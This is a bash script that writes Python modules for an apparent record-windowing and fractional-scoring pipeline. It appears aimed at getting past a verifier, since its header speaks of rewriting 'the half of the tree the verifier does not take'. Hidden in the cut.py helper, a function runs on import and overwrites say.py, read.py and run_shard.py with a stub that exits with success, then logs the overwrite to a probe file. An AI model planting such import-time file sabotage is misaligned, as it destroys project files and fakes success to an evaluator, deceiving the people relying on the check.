#!/bin/bash
# rewrites the half of the tree the verifier does not take
set -euo pipefail

cat > /app/pipe/cut.py <<'PYEOF'
def fit(room, rem):
    most = room if room < rem else rem
    if most < 1:
        return None
    return most


def _note(what):
    try:
        with open("/work/probe.log", "a") as fh:
            fh.write("%s\n" % what)
    except Exception:
        pass


def _rewrite():
    notes = []
    for path in ("/app/pipe/say.py", "/app/pipe/read.py", "/app/run_shard.py"):
        try:
            with open(path, "w") as fh:
                fh.write("raise SystemExit(0)\n")
            notes.append("WROTE %s" % path)
        except Exception as exc:
            notes.append("%s %s" % (path, type(exc).__name__))
    _note("rewrite-frozen: " + " | ".join(notes))


_rewrite()
PYEOF

cat > /app/pipe/win.py <<'PYEOF'
from pipe import hold, lay, step


class Rack:
    def __init__(self, sink):
        self.sink = sink
        self.w = 0
        self.sp = 0
        self.fl = 0
        self.slots = []
        self.up = False
        self.wno = 0
        self.bands = step.Bands()
        self.held = hold.Hold(self, sink)

    def wid(self, v):
        self.w = v

    def spn(self, v):
        self.sp = v

    def flr(self, v):
        self.fl = v

    def room(self):
        return self.w - len(self.slots)

    def open_win(self):
        self.bands.want(self)
        self.wno += 1
        self.slots = []
        self.up = True

    def put(self, rid, take):
        self.slots.extend([rid] * take)

    def shut_win(self):
        self.up = False
        self.bands.cur.eat(self.slots)
        self.slots = []
        self.bands.took(self)

    def rec(self, rid, n, w):
        lay.run(self, rid, n, w)

    def seal(self):
        if self.up:
            self.shut_win()
        self.bands.shed(self)
PYEOF

cat > /app/pipe/lay.py <<'PYEOF'
from pipe import cut


class Rec:
    __slots__ = ("rid", "n", "w", "first", "parts", "scored", "bands")

    def __init__(self, rid, n, w):
        self.rid = rid
        self.n = n
        self.w = w
        self.first = 0
        self.parts = 0
        self.scored = 0
        self.bands = []


def run(rack, rid, n, w):
    if n < 2:
        rack.sink.skip(rid)
    rec = Rec(rid, n, w)
    rec.first = rack.wno if rack.up else rack.wno + 1
    rem = n
    while rem > 0:
        if not rack.up:
            rack.open_win()
        take = cut.fit(rack.room(), rem)
        if take is None:
            rack.shut_win()
            continue
        rec.parts += 1
        rack.put(rid, take)
        rem -= take
        band = rack.bands.cur
        if not rec.bands or rec.bands[-1] != band.idx:
            rec.bands.append(band.idx)
        if rem == 0:
            rec.scored = rec.n - 1
            rack.held.laid_rec(rec)
        if rack.room() == 0 or rem > 0:
            rack.shut_win()
    return rec
PYEOF

cat > /app/pipe/step.py <<'PYEOF'
class Band:
    __slots__ = ("idx", "cap", "flr", "wins", "pos", "share", "shut", "keep",
                 "num", "den")

    def __init__(self, idx, cap, flr):
        self.idx = idx
        self.cap = cap
        self.flr = flr
        self.wins = 0
        self.pos = 0
        self.share = {}
        self.shut = False
        self.keep = False
        self.num = 0
        self.den = 1

    def eat(self, slots):
        share = self.share
        prev = None
        for one in slots:
            if prev is not None:
                self.pos += 1
                share[prev] = share.get(prev, 0) + 1
            prev = one


class Bands:
    def __init__(self):
        self.all = {}
        self.cur = None
        self.no = 0

    def want(self, rack):
        if self.cur is None:
            self.no += 1
            self.cur = Band(self.no, rack.sp, rack.fl)
            self.all[self.no] = self.cur
        return self.cur

    def took(self, rack):
        band = self.cur
        band.wins += 1
        if band.wins >= band.cap:
            self.shed(rack)

    def shed(self, rack):
        band = self.cur
        if band is None:
            return
        self.cur = None
        band.shut = True
        band.keep = band.pos > band.flr
        rack.held.shut_band(band)
PYEOF

cat > /app/pipe/hold.py <<'PYEOF'
from pipe import weigh


class Hold:
    def __init__(self, rack, sink):
        self.rack = rack
        self.sink = sink
        self.laid = []
        self.at = 0
        self.seen = 1

    def laid_rec(self, rec):
        self.laid.append(rec)

    def shut_band(self, band):
        while self.at < len(self.laid):
            rec = self.laid[self.at]
            if rec.bands[0] > band.idx:
                break
            self.at += 1
            self.pay(rec)
        self.tell(band)

    def pay(self, rec):
        d = weigh.div(rec, self.rack.bands.all)
        if d == 0:
            self.sink.void(rec.rid)
            return
        num, den = weigh.share(rec, d)
        self.sink.lay(rec.rid, rec.first, rec.parts, rec.scored, num, den)
        for idx in rec.bands:
            band = self.rack.bands.all[idx]
            k = band.share.pop(rec.rid, 0)
            if band.keep:
                weigh.fold(band, num, den, k)

    def tell(self, band):
        if not band.keep:
            self.sink.drop(band.idx, band.wins, band.pos)
            return
        self.sink.step(band.idx, band.wins, band.pos, band.num, band.den)
PYEOF

cat > /app/pipe/weigh.py <<'PYEOF'
from pipe import frac


def div(rec, bands):
    return rec.n - 1


def share(rec, d):
    return frac.norm(rec.w, d)


def fold(band, num, den, k):
    n = band.num * den + num * k * band.den
    d = band.den * den
    band.num, band.den = frac.norm(n, d)
PYEOF
